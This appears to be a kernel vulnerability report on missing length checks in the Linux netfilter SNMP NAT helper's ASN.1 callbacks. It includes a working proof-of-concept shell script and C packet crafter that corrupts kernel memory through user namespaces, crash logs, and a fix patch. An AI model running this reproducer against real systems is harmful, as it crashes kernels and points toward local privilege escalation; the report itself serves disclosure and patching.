@@ -1,0 +1,445 @@
+commit cc2d58634e0f ("netfilter: nf_nat_snmp_basic: use asn1 decoder library",
+first in 4.16) changed the nf_nat_snmp_basic module (which, when enabled, parses
+and modifies the ASN.1-encoded payloads of SNMP messages) so that the kernel's
+ASN.1 infrastructure is used instead of an open-coded parser. The common ASN.1
+decoder can invoke callbacks when certain objects are encountered. The SNMP
+helper has two such callbacks defined in nf_nat_snmp_basic.asn1:
+
+ - For the `version` field of a `Message` (a `INTEGER`), snmp_version() is
+   invoked.
+ - For each `IpAddress` (according to RFC 1155, a 4-byte octet string),
+   snmp_helper() is invoked.
+
+These callbacks contain the following code:
+
+
+int snmp_version(void *context, size_t hdrlen, unsigned char tag,
+                 const void *data, size_t datalen)
+{
+        if (*(unsigned char *)data > 1)
+                return -ENOTSUPP;
+        return 1;
+}
+
+int snmp_helper(void *context, size_t hdrlen, unsigned char tag,
+                const void *data, size_t datalen)
+{
+        struct snmp_ctx *ctx = (struct snmp_ctx *)context;
+        __be32 *pdata = (__be32 *)data;
+
+        if (*pdata == ctx->from) {
+                pr_debug("%s: %pI4 to %pI4\n", __func__,
+                         (void *)&ctx->from, (void *)&ctx->to);
+
+                if (*ctx->check)
+                        fast_csum(ctx, (unsigned char *)data - ctx->begin);
+                *pdata = ctx->to;
+        }
+
+        return 1;
+}
+
+
+The problem is that both of these callbacks can be invoked by the ASN.1 parser
+with `data` pointing at the end of the packet and `datalen==0` (even though, for
+the `INTEGER` type, X.690 says in section 8.3.1 that "The contents octets shall
+consist of one or more octets"), but they don't check whether there is
+sufficient input available. This means that snmp_version() can read up to one
+byte out-of-bounds and leak whether that byte was <=1, and snmp_helper() can
+read and potentially also write up to four bytes out-of-bounds.
+
+Unfortunately, KASAN can't detect the out-of-bounds reads because, as was
+pointed out in
+<https://lore.kernel.org/lkml/552d49b6-1b6e-c320-b56a-a119e360f1d7@gmail.com/>
+regarding a (harmless) out-of-bounds read in the TCP input path, the kernel
+stores a `struct skb_shared_info` at the end of the socket buffer allocation,
+directly behind the packet data. The kernel can only detect that a problem
+occurred based on the later effects of an out-of-bounds write.
+It might be a good idea to explicitly add some KASAN poison between the head
+data and struct skb_shared_info to make it easier for kernel fuzzers to discover
+issues like this in the future.
+
+
+There are two scenarios in which this bug might be attacked:
+
+ - A router that performs NAT translation is explicitly set up to invoke the
+   SNMP helper, and a device in the NATted network wants to attack the router.
+   This is probably very rare, since the router would need to be explicitly
+   configured to perform SNMP translation. On top of that, to corrupt memory,
+   an attacker would need to be able to completely fill an SKB; it isn't clear
+   to me whether that is possible remotely.
+ - A local attacker could exploit the bug by setting up new network namespaces
+   with an iptables configuration that invokes SNMP translation. This probably
+   works as a local privilege escalation against some distribution kernels.
+   The normal autoloading path for this code was only set up in
+   commit 95c97998aa9f ("netfilter: nf_nat_snmp_basic: add missing helper alias
+   name", first in 4.20), but from a glance, it looks like it would be possible
+   on kernels before 4.20 to instead first load one of the openvswitch module's
+   aliases "net-pf-16-proto-16-family-ovs_*" through ctrl_getfamily(), then use
+   ovs_ct_add_helper() to trigger loading of "nf_nat_snmp_basic" through the
+   alias "ip_nat_snmp_basic".
+
+
+The following is a reproducer for a git master build that causes a kernel oops
+(nf_nat_snmp_basic must be compiled into the kernel, or built as a module, I
+think):
+
+======================================================================
+#!/bin/sh
+unshare -mUrnp --mount-proc --fork bash <<SCRIPT_EOF
+set -e
+set -x
+
+# make "ip netns" work in here
+mount -t tmpfs none /var/run/
+cd /var/run
+
+# this namespace is the router with NAT
+ip link set dev lo up
+echo 1 > /proc/sys/net/ipv4/ip_forward
+/sbin/iptables -t nat -A POSTROUTING -o veth0 -j MASQUERADE
+/sbin/iptables -t raw -A PREROUTING -p udp --dport 162 -j CT --helper snmp_trap
+/sbin/iptables -A FORWARD -m conntrack --ctstate INVALID,NEW,RELATED,ESTABLISHED,SNAT,DNAT -m helper --helper snmp_trap -j ACCEPT
+
+# this namespace is the destination host for the SNMP trap message
+ip netns add netns1
+nsenter --net=/var/run/netns/netns1 ip link set dev lo up
+ip link add veth0 type veth peer name veth1
+ip link set veth1 netns netns1
+nsenter --net=/var/run/netns/netns1 /sbin/ifconfig veth1 192.168.0.2/24 up
+/sbin/ifconfig veth0 192.168.0.1/24 up
+
+# this namespace sends the SNMP trap message
+ip netns add netns2
+nsenter --net=/var/run/netns/netns2 ip link set dev lo up
+ip link add veth2 type veth peer name veth3
+ip link set veth3 netns netns2
+# /31 network, see RFC 3021
+# we want *.0.0.0 so that the 3 OOB bytes can be zero
+nsenter --net=/var/run/netns/netns2 /sbin/ifconfig veth3 10.0.0.0/31 up
+/sbin/ifconfig veth2 10.0.0.1/24 up
+nsenter --net=/var/run/netns/netns2 ip route add default via 10.0.0.1
+
+# debug
+ip route
+nsenter --net=/var/run/netns/netns2 ip route
+
+# run the PoC
+cat > udp_repro.c <<C_EOF
+#define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <stdarg.h>
+#include <net/if.h>
+#include <linux/if.h>
+#include <linux/ip.h>
+#include <linux/udp.h>
+#include <linux/in.h>
+#include <err.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+
+#define IPADDR(a,b,c,d) (((a)<<0)+((b)<<8)+((c)<<16)+((d)<<24))
+
+// "pc X" comments in the following array refer to indices into
+// nf_nat_snmp_basic_machine in "nf_nat_snmp_basic.asn1.c", which
+// is generated as part of the kernel's build process.
+// reading the ASN.1 decoder and the generated machine opcodes
+// seemed easier than trying to build ASN.1 by looking at the
+// spec or something like that...
+uint8_t snmp_packet[] = {
+  // pc 0: read tag, should match _tag(UNIV, CONS, SEQ) == 0x30
+  // length indef
+  0x30, 0x80,
+
+  // pc 2: read tag, should match _tag(UNIV, PRIM, INT) == 0x02
+  // version number
+  0x02, 0x01,
+  0x00,
+
+  // pc 5: read tag, should match _tag(UNIV, PRIM, OTS) == 0x04
+  0x04, 0x00,
+
+  // pc 7: read tag, should match _tagn(CONT, CONS,  0) == 0xa0
+  // selects GetRequest-PDU, length indef
+  0xa0, 0x80,
+
+  // pc 34: read INT request-id
+  0x02, 0x04,
+  0x00, 0x00, 0x00, 0x00,
+
+  // pc 36: read INT error-status
+  0x02, 0x04,
+  0x00, 0x00, 0x00, 0x00,
+
+  // pc 38: read INT error-index
+  0x02, 0x04,
+  0x00, 0x00, 0x00, 0x00,
+
+  // pc 40: read seq VarBindList
+  // length indef
+  0x30, 0x80,
+
+  // pc 42: read seq VarBind
+  // length indef
+  0x30, 0x80,
+
+  // ptr 44: read tag, should match _tag(UNIV, PRIM, OID) == 0x06
+  // ObjectName
+  // (can use 0x82 as length to have two bytes of length following)
+  // length chosen so that the end of packet data is directly
+  // followed by the skb_shared_info, with the whole thing in a
+  // kmalloc-512 slab.
+  0x06, 0x70,
+  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+
+  // ptr 46: read tag, should skip
+  // ptr 48: read tag, should skip
+  // ptr 50: read tag, should skip
+  // ptr 52: read tag, should match _tagn(APPL, PRIM,  0) == 0x40
+  // IpAddress
+  // we could also use a length of zero, and the callback would still
+  // be invoked, but we want control over the first byte so that we
+  // can create a source IP match.
+  0x40, 0x01,
+  // source IP 10.0.0.0
+  0x0a
+};
+
+void do_sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen) {
+  int res = sendto(sockfd, buf, len, flags, dest_addr, addrlen);
+  if (res != len) {
+    if (res == -1)
+      err(1, "send failed");
+    else
+      errx(1, "partial send?");
+  }
+}
+
+int main(void) {
+  int sock = socket(AF_INET, SOCK_DGRAM, 0);
+  if (sock == -1) err(1, "socket");
+
+  struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(162), .sin_addr = { .s_addr = IPADDR(192,168,0,2) } };
+
+  // __ip_append_data() overallocates by 15 bytes for some reason; cancel it out
+  // by using CORK to first send 15 bytes short, then append the remaining 15 bytes
+  do_sendto(sock, snmp_packet, sizeof(snmp_packet)-15, MSG_MORE, (struct sockaddr *)&sa, sizeof(sa));
+  do_sendto(sock, ((char*)snmp_packet)+sizeof(snmp_packet)-15, 15, 0, (struct sockaddr *)&sa, sizeof(sa));
+}
+C_EOF
+gcc -o udp_repro udp_repro.c -Wall
+nsenter --net=/var/run/netns/netns2 ./udp_repro
+SCRIPT_EOF
+======================================================================
+
+Corresponding splat:
+
+======================================================================
+[  260.101983] IPVS: ftp: loaded support on port[0] = 21
+[  260.134983] LoadPin: vda1 (254:1): writable
+[  260.135981] LoadPin: enforcement can be disabled.
+[  260.137085] LoadPin: kernel-module pinned obj="/lib/modules/5.0.0-rc5/kernel/net/bpfilter/bpfilter.ko" pid=1095 cmdline="/sbin/modprobe -q -- bpfilter"
+[  260.143100] bpfilter: Loaded bpfilter_umh pid 1096
+[  260.171851] IPVS: ftp: loaded support on port[0] = 21
+[  260.248339] IPv6: ADDRCONF(NETDEV_CHANGE): veth0: link becomes ready
+[  260.250475] IPv6: ADDRCONF(NETDEV_CHANGE): veth1: link becomes ready
+[  260.261136] IPVS: ftp: loaded support on port[0] = 21
+[  260.347678] IPv6: ADDRCONF(NETDEV_CHANGE): veth3: link becomes ready
+[  260.621924] page:ffffea000703de00 count:0 mapcount:-128 mapping:0000000000000000 index:0x0
+[  260.624264] flags: 0x17fffc000000000()
+[  260.625373] raw: 017fffc000000000 ffffea0007a6d408 ffffea000783fe08 0000000000000000
+[  260.627650] raw: 0000000000000000 0000000000000003 00000000ffffff7f 0000000000000000
+[  260.629926] page dumped because: VM_BUG_ON_PAGE(page_ref_count(page) == 0)
+[  260.631958] ------------[ cut here ]------------
+[  260.633312] kernel BUG at ./include/linux/mm.h:546!
+[  260.634771] invalid opcode: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC KASAN
+[  260.636693] CPU: 6 PID: 1121 Comm: udp_repro Not tainted 5.0.0-rc5 #263
+[  260.638583] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014
+[  260.641031] RIP: 0010:do_exit+0x1391/0x1440
+[  260.642266] Code: 89 86 68 05 00 00 48 89 ac 24 e0 00 00 00 e9 2a f5 ff ff 4d 89 fd e9 6d f2 ff ff 48 c7 c6 c0 cf 67 99 48 89 ef e8 ef a5 24 00 <0f> 0b 48 8d bb 20 05 00 00 e8 11 77 2b 00 48 8d bb 18 05 00 00 4c
+[  260.647667] RSP: 0018:ffff8881e083fd98 EFLAGS: 00010286
+[  260.649556] RAX: 000000000000003e RBX: ffff8881deed4240 RCX: 0000000000000000
+[  260.651639] RDX: 0000000000000000 RSI: dffffc0000000000 RDI: ffffffff9b65eaa0
+[  260.653712] RBP: ffffea000703de00 R08: ffffed103d633ec9 R09: ffffed103d633ec9
+[  260.655786] R10: 0000000000000001 R11: ffffed103d633ec8 R12: ffffea000703de34
+[  260.657857] R13: ffff8881e6262140 R14: ffff8881e083f918 R15: ffff8881e083fe78
+[  260.659939] FS:  0000000000000000(0000) GS:ffff8881eb180000(0000) knlGS:0000000000000000
+[  260.662281] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  260.664171] CR2: 00007fe2da7af5e0 CR3: 000000002de2b002 CR4: 0000000000360ee0
+[  260.666987] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[  260.670022] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[  260.672035] Call Trace:
+[  260.672761]  ? release_task+0x860/0x860
+[  260.673864]  ? __fd_install+0x88/0x140
+[  260.674946]  ? handle_mm_fault+0x82/0x130
+[  260.676100]  do_group_exit+0x79/0x120
+[  260.677157]  __x64_sys_exit_group+0x28/0x30
+[  260.678362]  do_syscall_64+0x73/0x160
+[  260.679440]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[  260.680878] RIP: 0033:0x7fe2da7af618
+[  260.681922] Code: Bad RIP value.
+[  260.682872] RSP: 002b:00007ffd5a5e12c8 EFLAGS: 00000246 ORIG_RAX: 00000000000000e7
+[  260.685057] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fe2da7af618
+[  260.687125] RDX: 0000000000000000 RSI: 000000000000003c RDI: 0000000000000000
+[  260.689197] RBP: 00007fe2daa8c8e0 R08: 00000000000000e7 R09: ffffffffffffff98
+[  260.691264] R10: 00007ffd5a5e1248 R11: 0000000000000246 R12: 00007fe2daa8c8e0
+[  260.693343] R13: 00007fe2daa91c20 R14: 0000000000000000 R15: 0000000000000000
+[  260.695412] Modules linked in: bpfilter
+[  260.696776] ---[ end trace d5f4a4a31d762416 ]---
+[  260.698931] RIP: 0010:do_exit+0x1391/0x1440
+[  260.700171] Code: 89 86 68 05 00 00 48 89 ac 24 e0 00 00 00 e9 2a f5 ff ff 4d 89 fd e9 6d f2 ff ff 48 c7 c6 c0 cf 67 99 48 89 ef e8 ef a5 24 00 <0f> 0b 48 8d bb 20 05 00 00 e8 11 77 2b 00 48 8d bb 18 05 00 00 4c
+[  260.705625] RSP: 0018:ffff8881e083fd98 EFLAGS: 00010286
+[  260.707183] RAX: 000000000000003e RBX: ffff8881deed4240 RCX: 0000000000000000
+[  260.708823] RDX: 0000000000000000 RSI: dffffc0000000000 RDI: ffffffff9b65eaa0
+[  260.710384] RBP: ffffea000703de00 R08: ffffed103d633ec9 R09: ffffed103d633ec9
+[  260.711888] R10: 0000000000000001 R11: ffffed103d633ec8 R12: ffffea000703de34
+[  260.713785] R13: ffff8881e6262140 R14: ffff8881e083f918 R15: ffff8881e083fe78
+[  260.715326] FS:  00007fe2dac99700(0000) GS:ffff8881eb180000(0000) knlGS:0000000000000000
+[  260.717071] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  260.718340] CR2: 00007fe2da7af5ee CR3: 000000002de2b002 CR4: 0000000000360ee0
+[  260.719867] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[  260.721389] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[  260.722923] Fixing recursive fault but reboot is needed!
+======================================================================
+
+
+It also works against a Debian testing distro kernel if you first (as root)
+set kernel.unprivileged_userns_clone=1 and modprobe nf_nat_snmp_basic; splat:
+
+======================================================================
+[17260.886470] IPv6: ADDRCONF(NETDEV_UP): veth1: link is not ready
+[17260.887304] IPv6: ADDRCONF(NETDEV_UP): veth0: link is not ready
+[17260.887310] IPv6: ADDRCONF(NETDEV_CHANGE): veth0: link becomes ready
+[17260.887334] IPv6: ADDRCONF(NETDEV_CHANGE): veth1: link becomes ready
+[17260.930188] IPv6: ADDRCONF(NETDEV_UP): veth3: link is not ready
+[17260.931286] IPv6: ADDRCONF(NETDEV_CHANGE): veth3: link becomes ready
+[17261.115583] BUG: Bad page state in process Xorg  pfn:276500
+[17261.115588] page:ffffcf4ac9d94000 count:-1 mapcount:0 mapping:0000000000000000 index:0x0
+[17261.115595] flags: 0x17fffc000000000()
+[17261.115598] raw: 017fffc000000000 dead000000000100 dead000000000200 0000000000000000
+[17261.115599] raw: 0000000000000000 0000000000000000 ffffffffffffffff 0000000000000000
+[17261.115601] page dumped because: nonzero _count
+[17261.115602] Modules linked in: veth xt_helper xt_conntrack nf_nat_snmp_basic nf_conntrack_snmp nf_conntrack_broadcast xt_CT xt_tcpudp nft_counter nft_chain_nat_ipv4 ipt_MASQUERADE nf_nat_ipv4 nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 nft_compat nf_tables nfnetlink uinput atm netrom appletalk psnap llc ax25 snd_hda_codec_generic snd_hda_intel snd_hda_codec snd_hda_core snd_hwdep snd_pcm snd_timer joydev qxl snd soundcore ttm drm_kms_helper drm sg evdev virtio_balloon serio_raw virtio_console crct10dif_pclmul crc32_pclmul pcspkr ghash_clmulni_intel button ip_tables x_tables autofs4 ext4 crc16 mbcache jbd2 fscrypto ecb btrfs xor zstd_decompress zstd_compress xxhash hid_generic usbhid hid raid6_pq libcrc32c crc32c_generic sr_mod cdrom ata_generic virtio_net net_failover virtio_blk failover crc32c_intel
+[17261.115641]  ata_piix libata ehci_pci aesni_intel uhci_hcd aes_x86_64 ehci_hcd crypto_simd cryptd virtio_pci usbcore scsi_mod psmouse glue_helper virtio_ring i2c_piix4 usb_common virtio floppy
+[17261.115652] CPU: 14 PID: 653 Comm: Xorg Not tainted 4.19.0-1-amd64 #1 Debian 4.19.12-1
+[17261.115653] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014
+[17261.115654] Call Trace:
+[17261.115681]  dump_stack+0x5c/0x80
+[17261.115688]  bad_page.cold.115+0x7f/0xb2
+[17261.115690]  get_page_from_freelist+0xf51/0x1200
+[17261.115694]  ? reservation_object_reserve_shared+0x32/0x70
+[17261.115696]  ? get_page_from_freelist+0x8c3/0x1200
+[17261.115698]  __alloc_pages_nodemask+0x112/0x2b0
+[17261.115703]  new_slab+0x288/0x6e0
+[17261.115707]  ? update_blocked_averages+0x3ca/0x560
+[17261.115708]  ___slab_alloc+0x378/0x500
+[17261.115710]  ? update_nohz_stats+0x41/0x50
+[17261.115713]  ? shmem_alloc_inode+0x16/0x30
+[17261.115715]  ? shmem_alloc_inode+0x16/0x30
+[17261.115716]  __slab_alloc+0x1c/0x30
+[17261.115717]  kmem_cache_alloc+0x192/0x1c0
+[17261.115719]  shmem_alloc_inode+0x16/0x30
+[17261.115722]  alloc_inode+0x1b/0x80
+[17261.115725]  new_inode_pseudo+0xc/0x60
+[17261.115726]  new_inode+0x12/0x30
+[17261.115728]  shmem_get_inode+0x49/0x220
+[17261.115731]  __shmem_file_setup.part.42+0x3f/0x130
+[17261.115754]  drm_gem_object_init+0x26/0x40 [drm]
+[17261.115758]  qxl_bo_create+0x79/0x170 [qxl]
+[17261.115762]  qxl_gem_object_create+0x60/0x120 [qxl]
+[17261.115764]  ? qxl_map_ioctl+0x20/0x20 [qxl]
+[17261.115767]  qxl_gem_object_create_with_handle+0x4e/0xb0 [qxl]
+[17261.115769]  qxl_alloc_ioctl+0x42/0xa0 [qxl]
+[17261.115777]  ? drm_dev_enter+0x19/0x50 [drm]
+[17261.115785]  drm_ioctl_kernel+0xa1/0xf0 [drm]
+[17261.115807]  drm_ioctl+0x1fc/0x390 [drm]
+[17261.115810]  ? qxl_map_ioctl+0x20/0x20 [qxl]
+[17261.115812]  ? ep_scan_ready_list.constprop.22+0x1fc/0x220
+[17261.115814]  ? __hrtimer_init+0xb0/0xb0
+[17261.115816]  ? timerqueue_add+0x52/0x80
+[17261.115834]  ? enqueue_hrtimer+0x38/0x90
+[17261.115835]  ? hrtimer_start_range_ns+0x1b7/0x2c0
+[17261.115836]  do_vfs_ioctl+0xa4/0x630
+[17261.115840]  ? __sys_recvmsg+0x83/0xa0
+[17261.115841]  ksys_ioctl+0x60/0x90
+[17261.115843]  __x64_sys_ioctl+0x16/0x20
+[17261.115846]  do_syscall_64+0x53/0x100
+[17261.115851]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[17261.115852] RIP: 0033:0x7fb3e93d3747
+[17261.115854] Code: 00 00 90 48 8b 05 49 a7 0c 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 19 a7 0c 00 f7 d8 64 89 01 48
+[17261.115855] RSP: 002b:00007ffc43daf3f8 EFLAGS: 00003246 ORIG_RAX: 0000000000000010
+[17261.115856] RAX: ffffffffffffffda RBX: 0000562c71bece00 RCX: 00007fb3e93d3747
+[17261.115857] RDX: 00007ffc43daf430 RSI: 00000000c0086440 RDI: 000000000000000e
+[17261.115857] RBP: 00007ffc43daf430 R08: 0000562c71bece00 R09: 00000000000003d1
+[17261.115858] R10: 0000562c71085010 R11: 0000000000003246 R12: 00000000c0086440
+[17261.115858] R13: 000000000000000e R14: 0000562c710bcba0 R15: 0000562c710d82f0
+[17261.115860] Disabling lock debugging due to kernel taint
+======================================================================
+
+
+I suggest the following patch (copy attached with proper whitespace); I have
+tested that it prevents my PoC from crashing the kernel, but I haven't tested
+whether SNMP NATting still works.
+
+======================================================================
+From b94c17fa81f8870885baaec7815eee8b789d2c7b Mon Sep 17 00:00:00 2001
+From: Jann Horn <jannh@google.com>
+Date: Wed, 6 Feb 2019 22:56:15 +0100
+Subject: [PATCH] netfilter: nf_nat_snmp_basic: add missing length checks in
+ ASN.1 cbs
+
+The generic ASN.1 decoder infrastructure doesn't guarantee that callbacks
+will get as much data as they expect; callbacks have to check the `datalen`
+parameter before looking at `data`. Make sure that snmp_version() and
+snmp_helper() don't read/write beyond the end of the packet data.
+
+(Also move the assignment to `pdata` down below the check to make it clear
+that it isn't necessarily a pointer we can use before the `datalen` check.)
+
+Fixes: cc2d58634e0f ("netfilter: nf_nat_snmp_basic: use asn1 decoder library")
+Signed-off-by: Jann Horn <jannh@google.com>
+---
+ net/ipv4/netfilter/nf_nat_snmp_basic_main.c | 7 ++++++-
+ 1 file changed, 6 insertions(+), 1 deletion(-)
+
+diff --git a/net/ipv4/netfilter/nf_nat_snmp_basic_main.c b/net/ipv4/netfilter/nf_nat_snmp_basic_main.c
+index a0aa13bcabda..0a8a60c1bf9a 100644
+--- a/net/ipv4/netfilter/nf_nat_snmp_basic_main.c
++++ b/net/ipv4/netfilter/nf_nat_snmp_basic_main.c
+@@ -105,6 +105,8 @@ static void fast_csum(struct snmp_ctx *ctx, unsigned char offset)
+ int snmp_version(void *context, size_t hdrlen, unsigned char tag,
+                 const void *data, size_t datalen)
+ {
++       if (datalen != 1)
++               return -EINVAL;
+        if (*(unsigned char *)data > 1)
+                return -ENOTSUPP;
+        return 1;
+@@ -114,8 +116,11 @@ int snmp_helper(void *context, size_t hdrlen, unsigned char tag,
+                const void *data, size_t datalen)
+ {
+        struct snmp_ctx *ctx = (struct snmp_ctx *)context;
+-       __be32 *pdata = (__be32 *)data;
++       __be32 *pdata;
+ 
++       if (datalen != 4)
++               return -EINVAL;
++       pdata = (__be32 *)data;
+        if (*pdata == ctx->from) {
+                pr_debug("%s: %pI4 to %pI4\n", __func__,
+                         (void *)&ctx->from, (void *)&ctx->to);
+-- 
+2.20.1.611.gfbb209baf1-goog
+======================================================================
